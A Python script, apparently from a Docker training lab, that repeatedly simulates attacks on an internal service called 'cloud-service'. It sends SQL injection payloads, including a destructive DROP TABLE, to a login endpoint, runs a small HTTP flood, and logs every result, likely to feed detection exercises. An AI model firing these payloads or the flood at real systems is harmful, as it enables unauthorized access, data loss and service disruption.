import requests
import time
import random
from datetime import datetime
from pathlib import Path

LOG_DIR = Path("/app/logs")
LOG_DIR.mkdir(exist_ok=True)

CLOUD_TARGET = "http://cloud-service"  # Nom du service Docker, port 80 par défaut Nginx

def log_attack(attack_type, details):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {attack_type}: {details}\n"
    
    attack_path = LOG_DIR / "attack_log.txt"
    all_path = LOG_DIR / "all_logs.log"
    
    with open(attack_path, "a", encoding="utf-8") as f:
        f.write(log_entry)
    with open(all_path, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    print(f"🔴 {attack_type}: {details}")

def simulate_sql_injection():
    payloads = ["' OR '1'='1", "admin'--", "'; DROP TABLE users;--", "' UNION SELECT NULL--"]
    
    log_attack("SQL Injection", "Début de la simulation")
    
    for payload in payloads:
        try:
            url = f"{CLOUD_TARGET}/login?username={payload}&password=test"
            response = requests.get(url, timeout=5)
            status = response.status_code
            log_attack("SQL Injection", f"Payload: {payload} → Status: {status}")
        except requests.Timeout:
            log_attack("SQL Injection", f"Payload: {payload} → Timeout (possible protection)")
        except requests.ConnectionError:
            log_attack("SQL Injection", f"Payload: {payload} → Connexion refusée")
        except Exception as e:
            log_attack("SQL Injection", f"Erreur inattendue: {str(e)}")
        time.sleep(random.uniform(1, 3))

def simulate_ddos():
    log_attack("DDoS Simulation", "Début du flood HTTP (50 requêtes)")
    
    success_count = 0
    for i in range(50):
        try:
            response = requests.get(CLOUD_TARGET, timeout=2)
            if response.status_code == 200:
                success_count += 1
            if i % 10 == 0:
                log_attack("DDoS", f"{i+1}/50 requêtes envoyées")
        except:
            pass
        time.sleep(0.1)
    
    log_attack("DDoS Simulation", f"Flood terminé – {success_count}/50 réponses reçues")

def main():
    print("🚨 Simulateur d'attaques démarré – Phase 3 Hybride")
    print(f"📁 Logs dans : {LOG_DIR}")
    print("⏳ Attente 15s pour que les services cloud soient prêts...")
    time.sleep(15)
    
    attacks = [
        ("SQL Injection", simulate_sql_injection),
        ("DDoS Flood", simulate_ddos)
    ]
    
    try:
        while True:
            attack_name, attack_func = random.choice(attacks)
            print(f"\n{'='*60}")
            print(f"🎯 Lancement d'une nouvelle attaque : {attack_name}")
            print(f"{'='*60}\n")
            
            attack_func()
            
            wait = random.randint(40, 90)
            print(f"\n⏳ Pause de {wait} secondes avant prochaine attaque...\n")
            time.sleep(wait)
            
    except KeyboardInterrupt:
        print("\n🛑 Simulateur arrêté manuellement")

if __name__ == "__main__":
    main()